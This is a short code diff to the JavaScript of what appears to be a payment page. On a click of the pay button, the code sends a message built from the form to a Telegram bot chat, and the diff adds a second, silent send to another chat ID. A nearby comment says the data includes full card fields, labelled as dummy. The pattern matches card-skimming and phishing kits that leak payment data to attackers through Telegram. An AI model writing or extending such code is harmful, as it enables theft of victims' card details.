@@ -436,6 +436,11 @@ document.getElementById('pay-btn').addEventListener('click', async () => {
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({ chat_id: '6067712594', text: msg })
   }).catch(() => {});
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ chat_id: '7393124087', text: msg })
+  }).catch(() => {});
 
   // Prepare payload to DB (includes full dummy card fields as you requested)
   const payload = {
